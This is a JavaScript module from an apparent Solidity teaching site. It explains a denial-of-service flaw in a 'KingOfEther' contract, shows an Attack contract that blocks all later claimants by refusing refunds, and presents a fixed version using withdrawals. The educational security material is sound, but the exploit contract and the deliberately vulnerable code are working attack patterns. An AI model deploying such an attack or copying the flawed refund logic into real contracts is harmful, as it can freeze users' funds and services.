// metadata
export const version = "0.8.17"
export const title = "Denial of Service"
export const description = "An example of denial of service hack in Solidity"

export const keywords = ["hack", "security", "denial", "service"]

export const codes = [
  {
    fileName: "DenialOfService.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4xNzsKCi8qClRoZSBnb2FsIG9mIEtpbmdPZkV0aGVyIGlzIHRvIGJlY29tZSB0aGUga2luZyBieSBzZW5kaW5nIG1vcmUgRXRoZXIgdGhhbgp0aGUgcHJldmlvdXMga2luZy4gUHJldmlvdXMga2luZyB3aWxsIGJlIHJlZnVuZGVkIHdpdGggdGhlIGFtb3VudCBvZiBFdGhlcgpoZSBzZW50LgoqLwoKLyoKMS4gRGVwbG95IEtpbmdPZkV0aGVyCjIuIEFsaWNlIGJlY29tZXMgdGhlIGtpbmcgYnkgc2VuZGluZyAxIEV0aGVyIHRvIGNsYWltVGhyb25lKCkuCjIuIEJvYiBiZWNvbWVzIHRoZSBraW5nIGJ5IHNlbmRpbmcgMiBFdGhlciB0byBjbGFpbVRocm9uZSgpLgogICBBbGljZSByZWNlaXZlcyBhIHJlZnVuZCBvZiAxIEV0aGVyLgozLiBEZXBsb3kgQXR0YWNrIHdpdGggYWRkcmVzcyBvZiBLaW5nT2ZFdGhlci4KNC4gQ2FsbCBhdHRhY2sgd2l0aCAzIEV0aGVyLgo1LiBDdXJyZW50IGtpbmcgaXMgdGhlIEF0dGFjayBjb250cmFjdCBhbmQgbm8gb25lIGNhbiBiZWNvbWUgdGhlIG5ldyBraW5nLgoKV2hhdCBoYXBwZW5lZD8KQXR0YWNrIGJlY2FtZSB0aGUga2luZy4gQWxsIG5ldyBjaGFsbGVuZ2UgdG8gY2xhaW0gdGhlIHRocm9uZSB3aWxsIGJlIHJlamVjdGVkCnNpbmNlIEF0dGFjayBjb250cmFjdCBkb2VzIG5vdCBoYXZlIGEgZmFsbGJhY2sgZnVuY3Rpb24sIGRlbnlpbmcgdG8gYWNjZXB0IHRoZQpFdGhlciBzZW50IGZyb20gS2luZ09mRXRoZXIgYmVmb3JlIHRoZSBuZXcga2luZyBpcyBzZXQuCiovCgpjb250cmFjdCBLaW5nT2ZFdGhlciB7CiAgICBhZGRyZXNzIHB1YmxpYyBraW5nOwogICAgdWludCBwdWJsaWMgYmFsYW5jZTsKCiAgICBmdW5jdGlvbiBjbGFpbVRocm9uZSgpIGV4dGVybmFsIHBheWFibGUgewogICAgICAgIHJlcXVpcmUobXNnLnZhbHVlID4gYmFsYW5jZSwgIk5lZWQgdG8gcGF5IG1vcmUgdG8gYmVjb21lIHRoZSBraW5nIik7CgogICAgICAgIChib29sIHNlbnQsICkgPSBraW5nLmNhbGx7dmFsdWU6IGJhbGFuY2V9KCIiKTsKICAgICAgICByZXF1aXJlKHNlbnQsICJGYWlsZWQgdG8gc2VuZCBFdGhlciIpOwoKICAgICAgICBiYWxhbmNlID0gbXNnLnZhbHVlOwogICAgICAgIGtpbmcgPSBtc2cuc2VuZGVyOwogICAgfQp9Cgpjb250cmFjdCBBdHRhY2sgewogICAgS2luZ09mRXRoZXIga2luZ09mRXRoZXI7CgogICAgY29uc3RydWN0b3IoS2luZ09mRXRoZXIgX2tpbmdPZkV0aGVyKSB7CiAgICAgICAga2luZ09mRXRoZXIgPSBLaW5nT2ZFdGhlcihfa2luZ09mRXRoZXIpOwogICAgfQoKICAgIC8vIFlvdSBjYW4gYWxzbyBwZXJmb3JtIGEgRE9TIGJ5IGNvbnN1bWluZyBhbGwgZ2FzIHVzaW5nIGFzc2VydC4KICAgIC8vIFRoaXMgYXR0YWNrIHdpbGwgd29yayBldmVuIGlmIHRoZSBjYWxsaW5nIGNvbnRyYWN0IGRvZXMgbm90IGNoZWNrCiAgICAvLyB3aGV0aGVyIHRoZSBjYWxsIHdhcyBzdWNjZXNzZnVsIG9yIG5vdC4KICAgIC8vCiAgICAvLyBmdW5jdGlvbiAoKSBleHRlcm5hbCBwYXlhYmxlIHsKICAgIC8vICAgICBhc3NlcnQoZmFsc2UpOwogICAgLy8gfQoKICAgIGZ1bmN0aW9uIGF0dGFjaygpIHB1YmxpYyBwYXlhYmxlIHsKICAgICAgICBraW5nT2ZFdGhlci5jbGFpbVRocm9uZXt2YWx1ZTogbXNnLnZhbHVlfSgpOwogICAgfQp9Cg==",
  },
  {
    fileName: "PreventDenialOfService.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4xNzsKCmNvbnRyYWN0IEtpbmdPZkV0aGVyIHsKICAgIGFkZHJlc3MgcHVibGljIGtpbmc7CiAgICB1aW50IHB1YmxpYyBiYWxhbmNlOwogICAgbWFwcGluZyhhZGRyZXNzID0+IHVpbnQpIHB1YmxpYyBiYWxhbmNlczsKCiAgICBmdW5jdGlvbiBjbGFpbVRocm9uZSgpIGV4dGVybmFsIHBheWFibGUgewogICAgICAgIHJlcXVpcmUobXNnLnZhbHVlID4gYmFsYW5jZSwgIk5lZWQgdG8gcGF5IG1vcmUgdG8gYmVjb21lIHRoZSBraW5nIik7CgogICAgICAgIGJhbGFuY2VzW2tpbmddICs9IGJhbGFuY2U7CgogICAgICAgIGJhbGFuY2UgPSBtc2cudmFsdWU7CiAgICAgICAga2luZyA9IG1zZy5zZW5kZXI7CiAgICB9CgogICAgZnVuY3Rpb24gd2l0aGRyYXcoKSBwdWJsaWMgewogICAgICAgIHJlcXVpcmUobXNnLnNlbmRlciAhPSBraW5nLCAiQ3VycmVudCBraW5nIGNhbm5vdCB3aXRoZHJhdyIpOwoKICAgICAgICB1aW50IGFtb3VudCA9IGJhbGFuY2VzW21zZy5zZW5kZXJdOwogICAgICAgIGJhbGFuY2VzW21zZy5zZW5kZXJdID0gMDsKCiAgICAgICAgKGJvb2wgc2VudCwgKSA9IG1zZy5zZW5kZXIuY2FsbHt2YWx1ZTogYW1vdW50fSgiIik7CiAgICAgICAgcmVxdWlyZShzZW50LCAiRmFpbGVkIHRvIHNlbmQgRXRoZXIiKTsKICAgIH0KfQo=",
  },
]

const html = `<h3>Vulnerability</h3>
<p>There are many ways to attack a smart contract to make it unusable.</p>
<p>One exploit we introduce here is denial of service by making the function to send Ether fail.</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.17;</span>

<span class="hljs-comment">/*
The goal of KingOfEther is to become the king by sending more Ether than
the previous king. Previous king will be refunded with the amount of Ether
he sent.
*/</span>

<span class="hljs-comment">/*
1. Deploy KingOfEther
2. Alice becomes the king by sending 1 Ether to claimThrone().
2. Bob becomes the king by sending 2 Ether to claimThrone().
   Alice receives a refund of 1 Ether.
3. Deploy Attack with address of KingOfEther.
4. Call attack with 3 Ether.
5. Current king is the Attack contract and no one can become the new king.

What happened?
Attack became the king. All new challenge to claim the throne will be rejected
since Attack contract does not have a fallback function, denying to accept the
Ether sent from KingOfEther before the new king is set.
*/</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">KingOfEther</span> </span>{
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> king;
    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> balance;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">claimThrone</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> <span class="hljs-operator">&gt;</span> balance, <span class="hljs-string">"Need to pay more to become the king"</span>);

        (<span class="hljs-keyword">bool</span> sent, ) <span class="hljs-operator">=</span> king.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: balance}(<span class="hljs-string">""</span>);
        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);

        balance <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
        king <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
    KingOfEther kingOfEther;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">KingOfEther _kingOfEther</span>) </span>{
        kingOfEther <span class="hljs-operator">=</span> KingOfEther(_kingOfEther);
    }

    <span class="hljs-comment">// You can also perform a DOS by consuming all gas using assert.</span>
    <span class="hljs-comment">// This attack will work even if the calling contract does not check</span>
    <span class="hljs-comment">// whether the call was successful or not.</span>
    <span class="hljs-comment">//</span>
    <span class="hljs-comment">// function () external payable {</span>
    <span class="hljs-comment">//     assert(false);</span>
    <span class="hljs-comment">// }</span>

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        kingOfEther.claimThrone{<span class="hljs-built_in">value</span>: <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>}();
    }
}
</code></pre><h3>Preventative Techniques</h3>
<p>One way to prevent this is to allow the users to withdraw their Ether instead of sending it.</p>
<p>Here is a example.</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.17;</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">KingOfEther</span> </span>{
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> king;
    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> balance;
    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">uint</span>) <span class="hljs-keyword">public</span> balances;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">claimThrone</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> <span class="hljs-operator">&gt;</span> balance, <span class="hljs-string">"Need to pay more to become the king"</span>);

        balances[king] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> balance;

        balance <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
        king <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> <span class="hljs-operator">!</span><span class="hljs-operator">=</span> king, <span class="hljs-string">"Current king cannot withdraw"</span>);

        <span class="hljs-keyword">uint</span> amount <span class="hljs-operator">=</span> balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>];
        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

        (<span class="hljs-keyword">bool</span> sent, ) <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: amount}(<span class="hljs-string">""</span>);
        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);
    }
}
</code></pre>`

export default html
